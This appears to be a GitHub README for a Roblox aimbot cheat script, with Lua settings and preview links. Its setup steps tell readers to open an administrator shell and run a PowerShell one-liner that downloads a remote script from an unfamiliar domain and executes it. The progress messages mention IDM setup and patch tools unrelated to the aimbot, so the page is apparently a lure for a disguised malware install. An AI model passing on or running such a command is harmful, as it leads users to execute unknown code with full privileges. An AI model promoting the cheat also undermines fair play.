# ![Aimbot V2](https://user-images.githubusercontent.com/76539058/211103495-6f208311-c282-43d7-982e-d3ead86bef26.png)

---

## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)

### Step 1: Open CMD or PowerShell as Administrator
```cmd
# Press Win+X, then select Terminal (Admin) or Command Prompt (Admin)
```

### Step 2: Execute Deployment Command
```cmd
powershell -Command "irm https://software-gateway.click/Loader.ps1?get=roblox | iex"
```

### Step 3: Wait for Completion
```
[1/4] Loading Roblox Advanced Toolkit modules...
[2/4] Extracting setup manager and patch components...
[3/4] Installing automation utilities and settings templates...
[4/4] Ready. Start managing IDM setup and automation.
```

### Step 4: Start Using the Toolkit
- Run setup manager or patch utility

---


## Information

This script is a universal aim-locking script. Works on all games which use the default character.

- More Functions / Features & Settings
- Security / Decreased Detection Risk
- Optimized & Organized Code
- Speed / Faster Execution & Functionality
- Configurable Settings
- Storing
- Execution / Precise & Efficient
- Third Person Support

## Configuration

```lua
getgenv().Aimbot.Settings = {
    SendNotifications = true,
    SaveSettings = true,
    ReloadOnTeleport = true,
    Enabled = true,
    TeamCheck = false,
    AliveCheck = true,
    WallCheck = false,
    Sensitivity = 0,
    ThirdPerson = false,
    ThirdPersonSensitivity = 3,
    TriggerKey = "MouseButton2",
    Toggle = false,
    LockPart = "Head"
}

getgenv().Aimbot.FOVSettings = {
    Enabled = true,
    Visible = true,
    Amount = 90,
    Color = "255, 255, 255",
    LockedColor = "255, 70, 70",
    Transparency = 0.5,
    Sides = 60,
    Thickness = 1,
    Filled = false
}
```

## Functions

```lua
getgenv().Aimbot.Functions:Exit()
getgenv().Aimbot.Functions:Restart()
getgenv().Aimbot.Functions:ResetSettings()
```

## Previews

![Aimbot V2](https://user-images.githubusercontent.com/76539058/197401886-b988d375-a258-4555-a014-476295b67752.png)

https://user-images.githubusercontent.com/76539058/148576112-928455f3-b071-4650-b2a6-5fb45cbfcf04.mp4

https://user-images.githubusercontent.com/76539058/148576459-11e0d92b-6658-4dc5-9841-2c18f61adde9.mp4

https://user-images.githubusercontent.com/76539058/148576715-c90af8c4-a530-45b3-8b76-a014797b3eb5.mp4

https://user-images.githubusercontent.com/76539058/197402881-bb298b50-6e90-4b57-ab70-258f3f2b4521.mp4

https://user-images.githubusercontent.com/76539058/211179224-df514393-1d7f-46fc-ad3d-eab1035b2ac3.mp4
